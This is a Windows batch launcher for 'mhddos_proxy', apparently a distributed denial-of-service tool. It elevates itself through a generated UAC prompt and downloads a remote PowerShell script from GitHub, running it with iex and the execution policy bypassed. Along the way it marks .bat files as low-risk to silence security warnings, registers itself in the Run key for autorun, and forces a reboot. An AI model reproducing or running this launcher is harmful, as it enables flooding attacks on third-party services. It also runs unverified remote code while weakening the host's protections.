@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%tmp%\getadmin.vbs" del "%tmp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%tmp%\getadmin.vbs" && "%tmp%\getadmin.vbs" && exit /B )
call:REG_autorun_del
call:REG_lowrisk_del
cls
set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; cls; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/mhddos-proxy-py/main/mhddos.ps1'))"
:: set "_PS1_COMMAND=& '%~dp0mhddos.ps1'"
:: ----------------------------------------------------------------------------------------------------------------------------------
:start
:: Old [Windows] check
call:OSver
:: [.NET Framework 4.5+] check
call:.NETver
if %_NET_short:.=% LSS 45 ( call:.NETsetup & goto:start)
:: Powershell version check
call:PWSHver
if %_PWSH% LSS 3 call:PWSHsetup
:: 
:: echo OS - %_OS% ; .NET - %_NET% ; PWSH - %_PWSH%.0
:: pause
:: goto:end
:: 

:: Get command from ps1 on server
:ps1
start "mhddos_proxy" powershell -executionpolicy bypass -noexit -command "%_PS1_COMMAND%"
:: End
:end
exit

::
::
::
:: ___________________        _______________        _______________        _______________        _______________        
::  ___________________        _______________        _______________        _______________        _______________       
::   ___________________        _______________        _______________        _______________        _______________      
::    __/\\____/\\___/\\_        __/\\\____/\\\_        __/\\\\\\\\\\\_        __/\\\____/\\\_        __/\\/\\\\\\___     
::     _\/\\\__/\\\\_/\\\_        _\//\\\__/\\\__        _\///////\\\/__        _\///\\\/\\\/__        _\/\\\////\\\__    
::      _\//\\\/\\\\\/\\\__        __\//\\\/\\\___        ______/\\\/____        ___\///\\\/____        _\/\\\__\//\\\_   
::       __\//\\\\\/\\\\\___        ___\//\\\\\____        ____/\\\/______        ____/\\\/\\\___        _\/\\\___\/\\\_  
::        ___\//\\\\//\\\____        ____\//\\\_____        __/\\\\\\\\\\\_        __/\\\/\///\\\_        _\/\\\___\/\\\_ 
::         ____\///__\///_____        _____\///______        _\///////////__        _\///____\///__        _\///____\///__
::
::
::

:: [>---- Temp folder ----<]
:mkdir_temp
set "folder=%TMP%\mhddos-temp"
if not exist "%folder%" mkdir "%folder%"
exit /b 0

:del_temp
if exist "%folder%" rd /s /q "%folder%"
exit /b 0

:: [>---- OS Version Check ----<]
:OSver
for /f "tokens=4-5 delims=. " %%i in ('ver') do set _OS=%%i.%%j
if %_OS:.=% GTR 60 exit /b 0
echo Your Windows is not supported
pause
goto:end

:: [>---- .NET Framework ----<]
:.NETver
reg query "HKLM\Software\Microsoft\NET Framework Setup\NDP\v4\Full" >nul
cls
if %errorlevel% NEQ 0 ( for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5" /v Version') do set _NET=%%a ) else ( for /f "skip=2 tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Version') do set _NET=%%a )
set "_NET_short=%_NET:~0,3%"
exit /b 0

:.NETsetup
echo ^(!^) // Missing .NET Framework 4.5+ ^(Your version is %_NET%^)
pause
call:mkdir_temp
:.NETsetup_download
call:.NETsetup_WebClient
:: Retry connection
if not exist "%folder%\ndp452.exe" echo Retrying connection to Microsoft Server... & goto:.NETsetup_download
echo ^(!^) // Installing . . .
powershell -executionpolicy bypass -command "Start-Process -FilePath '%folder%\ndp452.exe' -Wait -ArgumentList '/q /norestart'"
echo ^(!^) // done !
timeout 5 >nul
exit /b 0

:.NETsetup_WebClient
echo // Downloading NDP452-KB2901907-x86-x64-AllOS-ENU.exe ^[66.7 MB^] . . .
powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe','%folder%\ndp452.exe'); Start-Sleep -s 2"
exit /b 0

:: [>---- Powershell ----<]
:PWSHver
powershell -executionpolicy bypass -command "exit $PSVersionTable.PSVersion.Major"
set _PWSH=%errorlevel%
exit /b 0

:PWSHsetup
cls
echo ^(!^) // Missing ^Powershell 3.0+ ^(Your version is %_PWSH%.0^)
echo ^(!^) // After the installation restart required
pause
call:mkdir_temp
:PWSHsetup_download
if %PROCESSOR_ARCHITECTURE% EQU x86 ( call:PWSHsetup_WebClient_x86 ) else ( call:PWSHsetup_WebClient )
:: Retry connection
if not exist "%folder%\wmn3.msu" echo Retrying connection to Microsoft Server... & goto:PWSHsetup_download
echo ^(!^) // Installing . . .
powershell -executionpolicy bypass -command "Start-Process -FilePath '%folder%\wmn3.msu' -Wait -ArgumentList '/quiet /norestart'"
call:REG_lowrisk
call:REG_autorun
echo ^(!^) // done !
timeout 5 >nul
cls
echo ^(!^) // Restart required, please save your work
pause
shutdown -t 0 -r -f
exit

:PWSHsetup_WebClient
echo // Downloading Windows6.1-KB2506143-x64.msu ^[15.7 MB^] . . .
powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x64.msu','%folder%\wmn3.msu'); Start-Sleep -s 2"
exit /b 0
:PWSHsetup_WebClient_x86
echo // Downloading Windows6.1-KB2506143-x86.msu ^[11.7 MB^] . . .
powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x86.msu','%folder%\wmn3.msu'); Start-Sleep -s 2"
exit /b 0

:: [>---- regedit ----<]
:REG_lowrisk
set "_REG_lowrisk=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
reg query "%_REG_lowrisk%" >nul
if %errorlevel% EQU 1 reg add "%_REG_lowrisk%"
reg add "%_REG_lowrisk%" /v "LowRiskFileTypes" /d ".bat" /f
exit /b 0

:REG_lowrisk_del
set "_REG_lowrisk_del=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"
reg query "%_REG_lowrisk_del%"
if %errorlevel% NEQ 1 reg delete "%_REG_lowrisk_del%" /v "LowRiskFileTypes" /f
exit /b 0

:REG_autorun
set "_REG_autorun=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%_REG_autorun%" >nul
if %errorlevel% EQU 1 reg add /v "%_REG_autorun%" /f >nul
reg add "%_REG_autorun%" /v "mhddos.bat on next boot" /d "%~f0" /f >nul
exit /b 0

:REG_autorun_del
set "_REG_autorun_del=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%_REG_autorun_del%"
if %errorlevel% NEQ 1 reg delete "%_REG_autorun_del%" /v "mhddos.bat on next boot" /f
exit /b 0